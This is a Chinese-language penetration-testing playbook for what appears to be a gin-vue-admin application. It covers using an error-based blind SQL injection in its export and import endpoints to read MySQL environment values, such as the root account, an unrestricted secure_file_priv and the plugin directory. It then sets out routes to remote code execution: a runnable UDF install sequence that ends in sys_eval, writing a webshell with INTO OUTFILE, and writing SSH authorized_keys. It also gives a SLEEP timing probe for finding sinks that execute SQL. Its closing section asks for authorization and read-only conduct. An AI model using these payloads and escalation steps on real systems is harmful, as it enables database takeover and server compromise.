# 拿到盲注读原语后 —— 先摸 MySQL 环境,再决定要不要投 RCE

前提:你已经有一个**盲注读原语**(本文语境 = `sysExportTemplate`/`importExcel` 的
error-based 子查询回显,1 次请求读 1 个值)。

**别急着继续捞业务数据。先花 6~10 次请求把服务器环境读出来 —— 这几条决定
"这套系统有没有 RCE 路可走",也决定后面值不值得投入去找任意语句执行点。**

全部是**只读、零副作用**,在任何"用完恢复原状"的作业红线内都安全。

---

## 1. 必读的环境表达式

用 `CONCAT('Z',<expr>)` 之类包裹后塞进会报类型错的那一列,逐个读回来。

| 表达式 | 本次实测值 | 它告诉你什么 |
|---|---|---|
| `@@hostname` | `ip-172-31-36-4.ap-south-1.compute.internal` | ★ 云厂商 + 区域 + 内网 IP。判定 DB 落在哪台机、是否与控制台同机 |
| `@@version` | `5.7.43-log` | 版本 → UDF / `INTO OUTFILE` 能力与可用手法 |
| `CURRENT_USER()` | `root@localhost` | ★★ 连接账号。**是 `root` ⟹ FILE 权限几乎必然有** |
| `USER()` | `app@10.0.0.5` | 连接来源 host —— 判定本机还是内网跳 |
| `@@secure_file_priv` | `NULL` | ★★ **`NULL` = 无限制**!可 `LOAD_FILE` / `INTO OUTFILE` 任意路径 |
| `@@datadir` | `/www/server/data/` | ★ 路径暴露系统与面板。`/www/server/` = **宝塔(BT Panel)**,Linux |
| `@@plugin_dir` | `/usr/lib/mysql/plugin/` | UDF `.so` 的落地目标目录 |
| `@@basedir` | `/www/server/mysql/` | 安装路径,进一步佐证宝塔/编译安装 |
| `DATABASE()` | `app` | 当前连接的默认库名 |

**成本:约 9 次请求。收益:直接决定 RCE 路线是否存在。** 这比再多捞一堆业务表划算得多。

## 2. 两个读法上的坑

**坑 A —— `CONCAT` 遇 NULL 整体为 NULL。**
`@@secure_file_priv` 经常就是 `NULL`,直接 `CONCAT('Z',@@secure_file_priv)` 会返回空,
**看起来像"读取失败",其实是读到 NULL 了**。
→ 用哨兵值包裹:`IFNULL(@@secure_file_priv, 0x4e)`(`0x4e` = `'N'`),读回 `N` 即代表 NULL。

**坑 B —— 别把 `@@x` 写进会被字符串化的上下文。**
`@@version` 之类的字符串值本身能正常回显;但要注意 payload 总长度仍受
`tableName` 上限约束(见 `gva-export-template-write-primitive.md` 坑 1),
一条 payload 塞多个表达式会比想象中长 —— 一次读一个值最稳。

## 3. RCE 判定矩阵

读到上面那些值之后,按下表落座:

| 条件 | 可走的路 | 还缺什么 |
|---|---|---|
| `root@localhost` + `secure_file_priv=NULL` | **UDF 提权(首选)** | 一个**任意语句**执行点 |
| 同上 + 宝塔路径 | `INTO OUTFILE` 写 webshell 到站点根 | 同主机要有 **PHP** 站点(⚠️ Go 后端不执行 PHP,必须落到别的站点) |
| 同上 | `INTO DUMPFILE` 写 `/root/.ssh/authorized_keys` | mysqld 需以 root 运行(宝塔环境下**可能**成立,概率中等) |

**UDF 三连(拿到任意语句执行点后):**
```sql
SELECT 0x<so二进制> INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.so';
SELECT sys_eval('id');
```
`CREATE FUNCTION ... SONAME` 需要写 `mysql.func` ⟹ 必须 `root` ✓(本条已由 `CURRENT_USER()` 确认)。

**关键结论:**
> `root` + `secure_file_priv=NULL` + MySQL 5.7 ⟹ **RCE 的前置条件全部满足。**
> 此时唯一的缺口是"**能执行任意语句的 SQL sink**"。
> **只读型的 `INSERT ...` 注入不够** —— 必须找到直执 SQL 的字段/接口。
> 所以环境侦察的真正作用是:**判断值不值得去猎那个 sink。**

## 4. 已排除的 sink(别再浪费时间)

- ❌ `sysExportTemplate` 对象的 **`sql` 字段不是直执**。
  探针:创建模板时把 `sql` 设为 `SELECT SLEEP(4)`,再触发 `exportExcel` 计时 ——
  **仍 1.6s 返回,无延迟 ⟹ 未执行**。
  (同理 `importSql` / `joinTemplate` 也应先做同样的 SLEEP 探针再下结论。)

**SLEEP 计时探针是判定"某个字段/接口是否直执 SQL"的通用无损手法** ——
比去猜代码快,且零副作用。任何候选 sink 都先过一遍这个探针。

## 5. 纪律

- 环境读取全程**只读**,不留痕,符合"恢复原状"红线。
- **不要**在没有明确授权的情况下真的去 `INTO OUTFILE` / `LOAD_FILE` / 装 UDF ——
  侦察阶段只读,落地阶段才动写。
- 写文件会改目标机器状态;**先确认落点无害,并在方案里写清回滚方式**。
- 别把"前置条件满足"讲成"已经拿到 shell"。**条件 ≠ 结果**,报告里要分开写。
